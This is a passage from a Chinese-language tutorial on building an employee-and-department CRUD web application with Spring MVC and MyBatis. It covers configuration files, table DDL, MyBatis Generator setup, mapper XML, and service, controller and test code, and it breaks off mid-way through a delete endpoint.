-->\n  <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-test</artifactId>\n      <version>5.3.20</version>\n      <scope>test</scope>\n  </dependency>\n\n  <!-- Mybatis -->\n  <dependency>\n      <groupId>org.mybatis</groupId>\n      <artifactId>mybatis</artifactId>\n      <version>3.5.10</version>\n  </dependency>\n\n  <!-- spring 与 mybatis 的整合包 -->\n  <dependency>\n      <groupId>org.mybatis</groupId>\n      <artifactId>mybatis-spring</artifactId>\n      <version>2.0.7</version>\n  </dependency>\n\n  <!-- 数据库连接池，druid -->\n  <dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>druid</artifactId>\n    <version>1.2.10</version>\n  </dependency>\n\n  <!-- mysql驱动包 -->\n  <dependency>\n      <groupId>mysql</groupId>\n      <artifactId>mysql-connector-java</artifactId>\n      <version>8.0.29</version>\n  </dependency>\n\n  <!-- 逆向工程 -->\n  <dependency>\n      <groupId>org.mybatis.generator</groupId>\n      <artifactId>mybatis-generator-core</artifactId>\n      <version>1.4.1</version>\n  </dependency>\n  \n  <!-- pagehelper 分页插件 -->\n  <dependency>\n      <groupId>com.github.pagehelper</groupId>\n      <artifactId>pagehelper</artifactId>\n      <version>5.3.0</version>\n  </dependency>\n  \n  <!-- jackson-databind -->\n  <dependency>\n    <groupId>com.fasterxml.jackson.core</groupId>\n    <artifactId>jackson-databind</artifactId>\n    <version>2.13.3</version>\n  </dependency>\n\n</dependencies>\n```\n\n#### c.配置web.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n    <!-- step1: 配置全局的参数，启动Spring容器 -->\n    <context-param>\n        <param-name>contextConfigLocation</param-name>\n        <!-- 若没有提供值，默认会去找/WEB-INF/applicationContext.xml。 -->\n        <param-value>classpath:applicationContext.xml</param-value>\n    </context-param>\n    <listener>\n        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n    </listener>\n\n    <!-- step2: 配置SpringMVC的前端控制器，用于拦截所有的请求  -->\n    <servlet>\n        <servlet-name>springMVC</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            <!-- 若没有提供值，默认会去找WEB-INF/*-servlet.xml。 -->\n            <!-- 使用classpath:表示从类路径查找配置文件，例如maven工程中的src/main/resources -->\n            <param-value>classpath:springMVC.xml</param-value>\n        </init-param>\n        <!-- 启动优先级，数值越小优先级越大 -->\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>springMVC</servlet-name>\n        <!-- 将DispatcherServlet请求映射配置为\"/\"，则Spring MVC将捕获Web容器所有的请求，包括静态资源的请求 -->\n        <url-pattern>/</url-pattern>\n    </servlet-mapping>\n\n    <!-- step3: characterEncodingFilter字符编码过滤器，放在所有过滤器的前面 -->\n    <filter>\n        <filter-name>characterEncodingFilter</filter-name>\n        <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>\n        <init-param>\n            <!--要使用的字符集，一般我们使用UTF-8(保险起见UTF-8最好)-->\n            <param-name>encoding</param-name>\n            <param-value>UTF-8</param-value>\n        </init-param>\n        <init-param>\n            <!--是否强制设置request的编码为encoding，默认false，不建议更改-->\n            <param-name>forceRequestEncoding</param-name>\n            <param-value>false</param-value>\n        </init-param>\n        <init-param>\n            <!--是否强制设置response的编码为encoding，建议设置为true-->\n            <param-name>forceResponseEncoding</param-name>\n            <param-value>true</param-value>\n        </init-param>\n    </filter>\n    <filter-mapping>\n        <filter-name>characterEncodingFilter</filter-name>\n        <!--这里不能留空或者直接写 ' / ' ，否则可能不起作用-->\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n\n    <!-- step4: 配置过滤器，将post请求转为delete，put -->\n    <filter>\n        <filter-name>HiddenHttpMethodFilter</filter-name>\n        <filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>\n    </filter>\n    <filter-mapping>\n        <filter-name>HiddenHttpMethodFilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n</web-app>\n```\n\n#### d.配置springMVC.xml\n\n> Spring MVC 的配置文件，主要包含网站跳转逻辑的控制、配置。\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xmlns:mvc=\"http://www.springframework.org/schema/mvc\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd\">\n\n    <!-- step1: 配置Controller扫描方式 -->\n    <!-- 使用组件扫描的方式可以一次扫描多个Controller,只需指定包路径即可 -->\n    <context:component-scan base-package=\"com.jianjian.crud\" use-default-filters=\"false\">\n        <!-- 一般在SpringMVC的配置里，只扫描Controller层，Spring配置中扫描所有包，但是排除Controller层。\n        context:include-filter要注意，如果base-package扫描的不是最终包，那么其他包还是会扫描、加载，如果在SpringMVC的配置中这么做，会导致Spring不能处理事务，\n        所以此时需要在<context:component-scan>标签上，增加use-default-filters=\"false\"，就是真的只扫描context:include-filter包括的内容-->\n        <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    </context:component-scan>\n\n    <!-- step2: 标准配置 -->\n    <!-- 将 Spring MVC 不能处理的请求交给 tomcat 处理 -->\n    <mvc:default-servlet-handler/>\n    <!-- 简化注解配置，并提供更高级的功能 -->\n    <!--能支持 Spring MVC 更高级的一些功能，比如 JSR 303 校验、快捷的 Ajax 映射动态请求等-->\n    <mvc:annotation-driven />\n</beans>\n```\n\n#### e.配置applicationContext.xml\n\n> Spring 的配置文件，主要配置业务逻辑相关的内容：数据源、与MyBatis的整合、事务控制等。\n\n先创建一个 db.properties，用来保存数据库驱动的配置信息\n\n```properties\njdbc.driver=com.mysql.cj.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/ssm_crud?useUnicode=true&characterEncoding=utf8\njdbc.username=root\njdbc.password=root\n```\n\napplicationContext.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:tx=\"http://www.springframework.org/schema/tx\"\n       xmlns:aop=\"http://www.springframework.org/schema/aop\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd http://www.springframework.org/schema/aop https://www.springframework.org/schema/aop/spring-aop.xsd\">\n\n    <!-- step1: 配置包扫描方式。扫描所有包，但是排除Controller层 -->\n    <context:component-scan base-package=\"com.jianjian.crud\">\n        <context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\"/>\n    </context:component-scan>\n\n    <!-- step2: 配置数据库连接信息 -->\n    <!-- 引入properties文件 -->\n    <context:property-placeholder location=\"classpath:db.properties\"/>\n    <!--数据源的配置-->\n    <bean id=\"pooledDataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\">\n        <property name=\"driverClassName\" value=\"${jdbc.driver}\"/>\n        <property name=\"url\" value=\"${jdbc.url}\"/>\n        <property name=\"username\" value=\"${jdbc.username}\"/>\n        <property name=\"password\" value=\"${jdbc.password}\"/>\n    </bean>\n\n    <!-- step3: spring 与 mybatis 整合 -->\n    <!-- 配置sqlSessionFactory，需要引入 mybatis-spring 包 -->\n    <bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\">\n        <!-- 加载Mybatis全局配置文件 -->\n        <property name=\"configLocation\" value=\"classpath:mybatis-config.xml\"/>\n        <!-- 数据库连接池 -->\n        <property name=\"dataSource\" ref=\"pooledDataSource\"/>\n        <!-- 配置mapper文件位置，扫描映射文件 -->\n        <property name=\"mapperLocations\" value=\"classpath:mappers/*.xml\"/>\n    </bean>\n\n    <!-- step4: 配置批量执行的sqlSession(可选操作) -->\n    <bean id=\"sqlSession\" class=\"org.mybatis.spring.SqlSessionTemplate\">\n        <constructor-arg name=\"sqlSessionFactory\" ref=\"sqlSessionFactory\"/>\n        <constructor-arg name=\"executorType\" value=\"BATCH\"/>\n    </bean>\n\n    <!-- step5: 配置mapper扫描器，将 MyBatis 接口的实现加入到 IOC 容器中 -->\n    <bean class=\"org.mybatis.spring.mapper.MapperScannerConfigurer\">\n        <!--扫描所有的 DAO 接口的实现，加入到 IOC 容器中-->\n        <property name=\"basePackage\" value=\"com.jianjian.crud.dao\"></property>\n        <property name=\"sqlSessionFactoryBeanName\" value=\"sqlSessionFactory\"/>\n    </bean>\n\n    <!-- step6: 配置事务控制 -->\n    <bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\">\n        <!-- 配置数据源 -->\n        <property name=\"dataSource\" ref=\"pooledDataSource\"/>\n    </bean>\n\n    <!-- 配置aop -->\n    <aop:config>\n        <!-- 切入点表达式 -->\n        <!-- 第一个*表示返回任意类型，第二个*表示任意方法，..service下任意子包，（..）表示任意数量和类型的参数-->\n        <aop:pointcut id=\"txPoint\" expression=\"execution(* com.jianjian.crud.service..*(..))\"/>\n        <!-- 配置事务增强，指定切点表达式-->\n        <aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"txPoint\"/>\n    </aop:config>\n\n    <!-- 配置事务增强，事务如何增强-->\n    <tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\">\n        <tx:attributes>\n            <!-- * 代表所有方法都是事务方法-->\n            <tx:method name=\"*\"/>\n            <!-- get* 代表以get开始的所有方法-->\n            <tx:method name=\"get*\" read-only=\"true\"/>\n        </tx:attributes>\n    </tx:advice>\n</beans>\n```\n\n#### f.配置mybatis-config.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE configuration\n        PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-config.dtd\">\n<configuration>\n\n    <settings>\n        <!--将表中字段的下划线自动转换为驼峰-->\n        <setting name=\"mapUnderscoreToCamelCase\" value=\"true\"/>\n        <!--开启延迟加载-->\n        <setting name=\"lazyLoadingEnabled\" value=\"true\"/>\n    </settings>\n    <!--设置别名-->\n    <typeAliases>\n        <package name=\"com.jianjian.crud.bean\"/>\n    </typeAliases>\n    <!-- 使用分页插件 -->\n    <plugins>\n        <plugin interceptor=\"com.github.pagehelper.PageInterceptor\">\n            <!--分页参数合理化  -->\n            <property name=\"reasonable\" value=\"true\"/>\n        </plugin>\n    </plugins>\n    \n</configuration>\n```\n\n#### g.创建数据库表\n\n先创建名为 ssm_crud 的数据库，再创建员工表 tb_emp 和部门表 tb_dept\n\n```sql\nSET NAMES utf8mb4;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- Table structure for tb_dept\n-- ----------------------------\nDROP TABLE IF EXISTS `tb_dept`;\nCREATE TABLE `tb_dept` (\n  `dept_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '部门编号',\n  `dept_name` varchar(100) NOT NULL COMMENT '部门名称',\n  PRIMARY KEY (`dept_id`) USING BTREE,\n  UNIQUE KEY `uq_dept_name` (`dept_name`) USING BTREE\n) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;\n\n-- ----------------------------\n-- Records of tb_dept\n-- ----------------------------\nBEGIN;\nINSERT INTO `tb_dept` (`dept_id`, `dept_name`) VALUES (4, '人事部');\nINSERT INTO `tb_dept` (`dept_id`, `dept_name`) VALUES (1, '开发部');\nINSERT INTO `tb_dept` (`dept_id`, `dept_name`) VALUES (2, '测试部');\nINSERT INTO `tb_dept` (`dept_id`, `dept_name`) VALUES (3, '设计部');\nCOMMIT;\n\n-- ----------------------------\n-- Table structure for tb_emp\n-- ----------------------------\nDROP TABLE IF EXISTS `tb_emp`;\nCREATE TABLE `tb_emp` (\n  `emp_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '员工编号',\n  `emp_name` varchar(15) NOT NULL COMMENT '员工姓名',\n  `gender` int(4) DEFAULT NULL COMMENT '员工性别, 1男2女',\n  `email` varchar(255) DEFAULT NULL COMMENT '员工邮箱',\n  `d_id` int(11) DEFAULT NULL COMMENT '部门编号',\n  PRIMARY KEY (`emp_id`) USING BTREE,\n  KEY `fk_emp_dept` (`d_id`) USING BTREE,\n  KEY `uq_emp_name` (`emp_name`) USING BTREE,\n  CONSTRAINT `fk_emp_dept` FOREIGN KEY (`d_id`) REFERENCES `tb_dept` (`dept_id`)\n) ENGINE=InnoDB AUTO_INCREMENT=68 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;\n\n```\n\n### 2.逆向工程\n\n#### a.配置文件\n\nsrc/main/resources/mbg.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE generatorConfiguration\n        PUBLIC \"-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\">\n<generatorConfiguration>\n    <context id=\"DB2Tables\" targetRuntime=\"MyBatis3\">\n        <!-- 清除注释信息 -->\n        <commentGenerator>\n            <property name=\"suppressAllComments\" value=\"true\" />\n        </commentGenerator>\n\n        <!-- step1: 配置数据库连接信息 -->\n        <jdbcConnection driverClass=\"com.mysql.cj.jdbc.Driver\"\n                        connectionURL=\"jdbc:mysql://localhost:3306/ssm_crud\"\n                        userId=\"root\"\n                        password=\"root\">\n        </jdbcConnection>\n\n        <javaTypeResolver>\n            <property name=\"forceBigDecimals\" value=\"false\"/>\n        </javaTypeResolver>\n\n\n        <!-- step2: javaBean的生成策略-->\n        <javaModelGenerator targetPackage=\"com.jianjian.crud.bean\"\n                            targetProject=\"./src/main/java\">\n            <property name=\"enableSubPackages\" value=\"true\" />\n            <property name=\"trimStrings\" value=\"true\" />\n        </javaModelGenerator>\n\n        <!-- step3：SQL映射文件的生成策略 -->\n        <sqlMapGenerator targetPackage=\"mapper\"\n                         targetProject=\"./src/main/resources\">\n            <property name=\"enableSubPackages\" value=\"true\" />\n        </sqlMapGenerator>\n\n        <!-- step4: Mapper接口的生成策略 -->\n        <javaClientGenerator type=\"XMLMAPPER\"\n                             targetPackage=\"com.jianjian.crud.mapper\"\n                             targetProject=\"./src/main/java\">\n            <property name=\"enableSubPackages\" value=\"true\" />\n        </javaClientGenerator>\n\n        <!-- step5: 指定表的生成策略 -->\n        <table tableName=\"tb_emp\" domainObjectName=\"Employee\"/>\n        <table tableName=\"tb_dept\" domainObjectName=\"Department\"/>\n    </context>\n</generatorConfiguration>\n```\n\n#### b.生成逆向文件\n\n```java\npublic class MBGTest {\n    public static void main(String[] args) throws Exception {\n        List<String> warnings = new ArrayList<>();\n        boolean overwrite = true;\n        File configFile = new File(\"src/main/resources/mbg.xml\");\n        ConfigurationParser cp = new ConfigurationParser(warnings);\n        Configuration config = cp.parseConfiguration(configFile);\n        DefaultShellCallback callback = new DefaultShellCallback(overwrite);\n        MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings);\n        myBatisGenerator.generate(null);\n    }\n}\n```\n\n#### c.修改逆向文件\n\n修改 Employee 类，添加部门属性和构造方法\n\n```java\n//希望查询员工的同时，也查询部门信息\nprivate Department department;\n//为了给表插入数据，需要提供一个不带部门的构造器\npublic Employee(Integer empId, String empName, Integer gender, String email, Integer dId) {\n  this.empId = empId;\n  this.empName = empName;\n  this.gender = gender;\n  this.email = email;\n  this.dId = dId;\n}\npublic Employee() {\n}\n```\n\n修改 Department 类，添加构造方法\n\n```java\npublic class Department {\n    private Integer deptId;\n    private String deptName;\n}\npublic Department() {\n}\n```\n\n修改 EmployeeMapper 接口\n\n```java\npublic interface EmployeeMapper {\n\t......\n        \n    List<Employee> selectByExampleWithDept(EmployeeExample example);\n\n    Employee selectByPrimaryKeyWithDept(Integer empId);\n    \n\t......\n}\n```\n\n修改 EmployeeMapper.xml\n\n```xml\n  <!--新增的带有部门信息的返回结果集-->\n  <resultMap id=\"WithDeptResultMap\" type=\"com.jianjian.crud.bean.Employee\">\n    <id column=\"emp_id\" jdbcType=\"INTEGER\" property=\"empId\" />\n    <result column=\"emp_name\" jdbcType=\"VARCHAR\" property=\"empName\" />\n    <result column=\"gender\" jdbcType=\"INTEGER\" property=\"gender\" />\n    <result column=\"email\" jdbcType=\"VARCHAR\" property=\"email\" />\n    <result column=\"d_id\" jdbcType=\"INTEGER\" property=\"dId\" />\n    <association property=\"department\" javaType=\"com.jianjian.crud.bean.Department\">\n      <id column=\"dept_id\" property=\"deptId\"/>\n      <result column=\"dept_name\" property=\"deptName\"/>\n    </association>\n  </resultMap>\n\n\t<!--带部门列的sql-->\n  <sql id=\"WithDept_Column_List\">\n    e.emp_id, e.emp_name, e.gender, e.email, e.d_id, d.dept_id, d.dept_name\n  </sql>\n\n  <!--新增的带部门查询-->\n  <select id=\"selectByExampleWithDept\" parameterType=\"com.jianjian.crud.bean.EmployeeExample\" resultMap=\"WithDeptResultMap\">\n    select\n    <if test=\"distinct\">\n      distinct\n    </if>\n    <include refid=\"WithDept_Column_List\" />\n    from tb_emp e left join tb_dept d on e.d_id=d.dept_id\n    <if test=\"_parameter != null\">\n      <include refid=\"Example_Where_Clause\" />\n    </if>\n    <if test=\"orderByClause != null\">\n      order by ${orderByClause}\n    </if>\n  </select>\n  <select id=\"selectByPrimaryKeyWithDept\" parameterType=\"java.lang.Integer\" resultMap=\"WithDeptResultMap\">\n    select\n    <include refid=\"WithDept_Column_List\" />\n    from tb_emp e left join tb_dept d on e.d_id=d.dept_id\n    where emp_id = #{empId,jdbcType=INTEGER}\n  </select>\n```\n\n#### d.测试Mapper\n\nSpring 整合 Junit 5 测试 Mapper 添加数据\n\n```java\n@SpringJUnitConfig(locations = \"classpath:applicationContext.xml\")\npublic class MapperTest {\n\n    @Autowired\n    DepartmentMapper departmentMapper;\n\n    @Autowired\n    EmployeeMapper employeeMapper;\n\n    @Autowired\n    SqlSession sqlSession;\n\n    @Test\n    public void testDept() {\n        //新增部门信息\n        departmentMapper.insertSelective(new Department(null, \"简简部\"));\n    }\n\n    @Test\n    public void testEmp() {\n        //插入一条员工数据\n        employeeMapper.insertSelective(new Employee(null, \"张三\", 1, \"zhangsan@qq.com\", 1));\n        employeeMapper.insertSelective(new Employee(null, \"李四\", 1, \"lisi@163.com\", 1));\n        \n    }\n    @Test\n    public void testBatchEmp() {\n        //批量插入员工数据\n        EmployeeMapper mapper = sqlSession.getMapper(EmployeeMapper.class);\n        for (int i = 0; i < 100; i++) {\n            String uid = UUID.randomUUID().toString().substring(0, 5) + i;\n            mapper.insertSelective(new Employee(null, uid, 2, uid + \"@gmail.com\", 2));\n        }\n    }\n}\n```\n\n### 3.查询数据\n\n- Controller 是为前端提供的访问入口，不用关心具体的业务逻辑。具体的业务逻辑放在了 ServiceImpl里，Controller 只需调用它封装好的方法即可。\n- Service 提供业务逻辑要用到的方法，ServiceImpl 提供方法的具体实现。即，ServiceImpl 负责了主要的功能编写，Controller 提供了使用的入口。\n- Mapper 为 ServiceImpl 提供操作数据的方法，但方法的具体实现(也就是SQL语句)放在了mapper下的xml文件里。\n\n\n\n#### Service\n\n```java\npublic interface EmployeeService {\n    List<Employee> getAll();\n}\n```\n\n```java\n@Service\npublic class EmployeeServiceImpl implements EmployeeService {\n    \n    @Autowired\n    EmployeeMapper employeeMapper;\n\n    @Override\n    public List<Employee> getAll() {\n        return employeeMapper.selectByExampleWithDept(null);\n    }\n}\n```\n\n#### Controller\n\n```java\n@Controller\npublic class EmployeeController {\n    \n    @Autowired\n    EmployeeService employeeService;\n\n     /**\n     * 分页查询所有员工\n     */\n    @RequestMapping(value = \"/employees\", method = {RequestMethod.GET})\n    @ResponseBody\n    public Msg getEmpsWithJson(@RequestParam(value = \"pageNum\", defaultValue = \"1\") Integer pageNum,@RequestParam(value = \"pageSize\", defaultValue = \"5\") Integer pageSize) {\n        //参数pageNum是页码值   参数pageSize 代表是每页显示条数\n        PageHelper.startPage(pageNum, pageSize);\n        List<Employee> emps = employeeService.getAll();\n        //用PageInfo对结果进行包装 ，navigatePages 导航页号\n        PageInfo page = new PageInfo(emps, 4);\n        return Msg.success().add(\"pageInfo\", page);\n    }\n\n}\n```\n\n添加 Msg 类引入链式编程\n\n```java\npackage com.jianjian.crud.bean;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n//通用的用来返回JSON数据的类\npublic class Msg {\n\n    private int code;//状态码 100成功 200失败\n    private String msg;//用户返回给浏览器的数据\n    private Map<String, Object> data = new HashMap<>();//用户返回给浏览器的数据\n\n    public static Msg success() {\n        Msg result = new Msg();\n        result.setCode(100);\n        result.setMsg(\"处理成功\");\n        return result;\n    }\n\n    public static Msg fail() {\n        Msg result = new Msg();\n        result.setCode(200);\n        result.setMsg(\"处理失败\");\n        return result;\n    }\n\n    //链式编程\n    public Msg add(String key, Object value) {\n        this.getData().put(key, value);\n        return this;\n    }\n\n    public int getCode() {\n        return code;\n    }\n\n    public void setCode(int code) {\n        this.code = code;\n    }\n\n    public String getMsg() {\n        return msg;\n    }\n\n    public void setMsg(String msg) {\n        this.msg = msg;\n    }\n\n    public Map<String, Object> getData() {\n        return data;\n    }\n\n    public void setData(Map<String, Object> data) {\n        this.data = data;\n    }\n}\n```\n\n﻿\n\n#### Mapper\n\n```java\npublic interface EmployeeMapper {\n  List<Employee> selectByExampleWithDept(EmployeeExample example);\n}\n```\n\n```xml\n  <!--带部门查询-->\n<select id=\"selectByExampleWithDept\" parameterType=\"com.jianjian.crud.bean.EmployeeExample\" resultMap=\"WithDeptResultMap\">\n  select\n  <if test=\"distinct\">\n    distinct\n  </if>\n  <include refid=\"WithDept_Column_List\" />\n  from tb_emp e left join tb_dept d on e.d_id=d.dept_id\n  <if test=\"_parameter != null\">\n    <include refid=\"Example_Where_Clause\" />\n  </if>\n  <if test=\"orderByClause != null\">\n    order by ${orderByClause}\n  </if>\n</select>\n\n<!--带部门列的sql-->\n<sql id=\"WithDept_Column_List\">\n  e.emp_id, e.emp_name, e.gender, e.email, e.d_id, d.dept_id, d.dept_name\n</sql>\n```\n\n#### MVCTest\n\n```java\n@WebAppConfiguration\n@SpringJUnitConfig(locations = {\"classpath:applicationContext.xml\", \"classpath:springMVC.xml\"})\npublic class MVCTest {\n\n    //传入MVC的IOC容器\n    @Autowired\n    WebApplicationContext context;\n\n    //虚拟MVC请求，获取处理结果\n    MockMvc mockMvc;\n\n    @BeforeEach\n    public void initMokcMvc() {\n        mockMvc = MockMvcBuilders.webAppContextSetup(context).build();\n    }\n\n    @Test\n    public void testPage() throws Exception {\n        //模拟请求拿到返回值\n        MvcResult result = mockMvc.perform(MockMvcRequestBuilders.get(\"/employees\").param(\"pageNum\", \"1\").param(\"pageSize\",\"5\")).andReturn();\n        MockHttpServletRequest request = result.getRequest();\n        System.out.println(\"请求\"+request);\n\n    }\n\n}\n```\n\n### 4.修改数据\n\n- 点击编辑按钮，弹出用户修改的对话框。\n- 对话框可以回显用户的信息，包括部门信息。\n- 点击确定，完成修改操作。\n\n#### Service\n\n```java\npublic interface EmployeeService {\n    ......\n\n    Employee getEmp(Integer empId);\n  \n \t\tvoid updateEmp(Employee employee);\n\n}\n```\n\n```java\n@Service\npublic class EmployeeServiceImpl implements EmployeeService {\n\n    @Autowired\n    EmployeeMapper employeeMapper;\n\n\t\t......\n\n    @Override\n    public Employee getEmp(Integer empId) {\n        return employeeMapper.selectByPrimaryKey(empId);\n    }\n  \n    @Override\n    public void updateEmp(Employee employee) {\n        employeeMapper.updateByPrimaryKey(employee);\n    }\n}\n```\n\n```java\npublic interface DepartmentService {\n    List<Department> getAllDept();\n}\n```\n\n```java\n@Service\npublic class DepartmentServiceImpl implements DepartmentService {\n    @Autowired\n    DepartmentMapper departmentMapper;\n    @Override\n    public List<Department> getAllDept() {\n        return departmentMapper.selectByExample(null);\n    }\n}\n```\n\n#### Controller\n\n```java\n@Controller\npublic class EmployeeController {\n    @Autowired\n    EmployeeService employeeService;\n  \n\t\t......\n      \n    /**\n     * 查询指定员工\n     */\n    @RequestMapping(value = \"/emp/{empId}\", method = {RequestMethod.GET})\n    @ResponseBody\n    public Msg getEmployee(@PathVariable(\"empId\") Integer empId) {\n        Employee employee = employeeService.getEmp(empId);\n        return Msg.success().add(\"emp\", employee);\n    }\n\n    /**\n     * 更新员工信息\n     */\n    @RequestMapping(value = \"/update\", method = {RequestMethod.PUT})\n    @ResponseBody\n    public Msg updateEmployees(@RequestBody Employee employee) {\n        employeeService.updateEmp(employee);\n        return Msg.success();\n    }\n}\n```\n\n```java\n@Controller\npublic class DepartmentController {\n\n    @Autowired\n    DepartmentService departmentService;\n\n    /**\n     *查询所有部门\n     */\n    @RequestMapping(value =\"/dept\",method = {RequestMethod.GET})\n    @ResponseBody\n    public Msg getDepartments() {\n        List<Department> dept = departmentService.getAllDept();\n        return Msg.success().add(\"dept\", dept);\n    }\n}\n```\n\n#### Mapper\n\n```java\npublic interface EmployeeMapper {\n\n\t\t......\n      \n    Employee selectByPrimaryKey(Integer empId);\n\n    int updateByPrimaryKey(Employee row);\n}\n```\n\n```xml\n<select id=\"selectByPrimaryKey\" parameterType=\"java.lang.Integer\" resultMap=\"BaseResultMap\">\n  select \n  <include refid=\"Base_Column_List\" />\n  from tb_emp\n  where emp_id = #{empId,jdbcType=INTEGER}\n</select>\n\n<sql id=\"Base_Column_List\">\n  emp_id, emp_name, gender, email, d_id\n</sql>\n\n<update id=\"updateByPrimaryKey\" parameterType=\"com.jianjian.crud.bean.Employee\">\n  update tb_emp\n  set emp_name = #{empName,jdbcType=VARCHAR},\n  gender = #{gender,jdbcType=INTEGER},\n  email = #{email,jdbcType=VARCHAR},\n  d_id = #{dId,jdbcType=INTEGER}\n  where emp_id = #{empId,jdbcType=INTEGER}\n</update>\n```\n\n```java\npublic interface DepartmentMapper {\n    List<Department> selectByExample(DepartmentExample example);\n}\n```\n\n```xml\n<select id=\"selectByExample\" parameterType=\"com.jianjian.crud.bean.DepartmentExample\" resultMap=\"BaseResultMap\">\n  select\n  <if test=\"distinct\">\n    distinct\n  </if>\n  <include refid=\"Base_Column_List\" />\n  from tb_dept\n  <if test=\"_parameter != null\">\n    <include refid=\"Example_Where_Clause\" />\n  </if>\n  <if test=\"orderByClause != null\">\n    order by ${orderByClause}\n  </if>\n</select>\n\n<sql id=\"Base_Column_List\">\n  dept_id, dept_name\n</sql>\n```\n\n### 5.添加数据\n\n- 点击“新增”弹出对话框\n- 去数据库中查询部门列表，显示在对话框内\n- 对用户输入的数据进行校验\n- 保存输入数据\n\n#### Service\n\n```java\npublic interface EmployeeService {\n\n\t\t......\n      \n    void addEmp(Employee employee);\n}\n\n```\n\n```java\n@Service\npublic class EmployeeServiceImpl implements EmployeeService {\n\n    @Autowired\n    EmployeeMapper employeeMapper;\n\n\t\t......\n\n    @Override\n    public void addEmp(Employee employee) {\n        employeeMapper.insert(employee);\n    }\n}\n```\n\n#### Controller\n\n```java\n@Controller\npublic class EmployeeController {\n    @Autowired\n    EmployeeService employeeService;\n\n\t\t......\n\n    /**\n     * 添加员工\n     */\n    @RequestMapping(value = \"/add\", method = {RequestMethod.POST})\n    @ResponseBody\n    public Msg addEmployees(@RequestBody Employee employee) {\n        employeeService.addEmp(employee);\n        return Msg.success();\n    }\n}\n```\n\n#### Mapper\n\n```java\npublic interface EmployeeMapper {\n\n\t\t......\n\n    int insert(Employee row);\n}\n```\n\n```xml\n<insert id=\"insert\" parameterType=\"com.jianjian.crud.bean.Employee\">\n  insert into tb_emp (emp_id, emp_name, gender, \n  email, d_id)\n  values (#{empId,jdbcType=INTEGER}, #{empName,jdbcType=VARCHAR}, #{gender,jdbcType=INTEGER}, \n  #{email,jdbcType=VARCHAR}, #{dId,jdbcType=INTEGER})\n</insert>\n```\n\n### 6.删除数据\n\n- 单个删除：点击某条用户的删除按钮，弹出提示框，点击确定即可删除\n- 批量删除：选择多条用户，再点击删除按钮，弹出提示框，点击确定即可删除\n\n#### Service\n\n```java\npublic interface EmployeeService {\n\n\t\t......\n\n    void deleteEmp(Integer empId);\n\n    int deleteBatchEmp(List<Integer>  empIds);\n}\n```\n\n```java\n@Service\npublic class EmployeeServiceImpl implements EmployeeService {\n\n    @Autowired\n    EmployeeMapper employeeMapper;\n  \n\t\t......\n\n    @Override\n    public void deleteEmp(Integer empId) {\n         employeeMapper.deleteByPrimaryKey(empId);\n    }\n\n    @Override\n    public int deleteBatchEmp(List<Integer> empIds) {\n        return employeeMapper.deleteBatchByIds(empIds);\n    }\n}\n```\n\n#### Controller\n\n```java\n@Controller\npublic class EmployeeController {\n    @Autowired\n    EmployeeService employeeService;\n\n\t\t......\n\n    /**\n     * 删除指定员工\n     */\n    @RequestMapping(value = \"/delete/{empId}\", method = {RequestMethod.DELETE})\n    @ResponseBody\n    public Msg deleteEmployee(@PathVariable(\"empId\") Integer empId) {\n        